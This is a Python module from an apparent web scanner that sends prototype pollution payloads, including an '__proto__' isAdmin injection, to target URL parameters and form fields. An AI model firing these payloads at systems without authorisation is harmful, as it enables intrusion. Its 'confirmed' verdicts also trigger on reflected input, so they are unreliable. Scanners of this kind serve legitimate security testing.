"""
APEX Prototype Pollution Scanner
Detects JavaScript prototype pollution vulnerabilities
"""
import json
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


def scan_prototype_pollution(target_url, discovered):
    """Scan for JavaScript prototype pollution vulnerabilities."""
    vulns = []
    sess = requests.Session()
    sess.verify = False

    pollution_payloads = [
        {'__proto__': {'polluted': 'APEX_PROTO_TEST'}},
        {'__proto__': {'isAdmin': True}},
        {'constructor': {'prototype': {'polluted': 'APEX_PROTO_TEST'}}},
        {'__proto__': {'__proto__': {'polluted': 'APEX_PROTO_TEST'}}},
    ]

    # Test URL parameters
    for page in discovered.get('pages', [])[:10]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in pollution_payloads[:3]:
                    try:
                        json_payload = json.dumps(payload)
                        test_params = params.copy()
                        test_params[param] = [json_payload]
                        new_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        r = sess.get(test_url, timeout=5)

                        # Check for pollution indicators
                        if 'polluted' in r.text.lower() or 'APEX_PROTO_TEST' in r.text:
                            vulns.append({
                                'type': 'prototype_pollution',
                                'endpoint': page, 'parameter': param,
                                'payload': json_payload[:100],
                                'result': 'Prototype pollution confirmed',
                                'confirmed': True, 'severity': 'critical',
                                'target': target_url,
                                'description': f'Prototype pollution via {param}. Can lead to RCE in Node.js.'
                            })
                            break
                    except:
                        pass

    # Test forms with JSON
    for form in discovered.get('forms', [])[:10]:
        for inp in form.get('inputs', [])[:5]:
            name = inp.get('name', '')
            if not name:
                continue
            for payload in pollution_payloads[:3]:
                try:
                    data = {name: payload}
                    headers = {'Content-Type': 'application/json'}
                    if form.get('method') == 'post':
                        r = sess.post(form['url'], json=data, headers=headers, timeout=5)
                    else:
                        r = sess.get(form['url'], json=data, headers=headers, timeout=5)
                    if 'polluted' in r.text.lower() or 'APEX_PROTO_TEST' in r.text:
                        vulns.append({
                            'type': 'prototype_pollution',
                            'endpoint': form['url'], 'parameter': name,
                            'payload': json.dumps(payload)[:100],
                            'result': 'Prototype pollution via form',
                            'confirmed': True, 'severity': 'critical',
                            'target': target_url,
                            'description': f'Prototype pollution via form field {name}.'
                        })
                        break
                except:
                    pass

    return vulns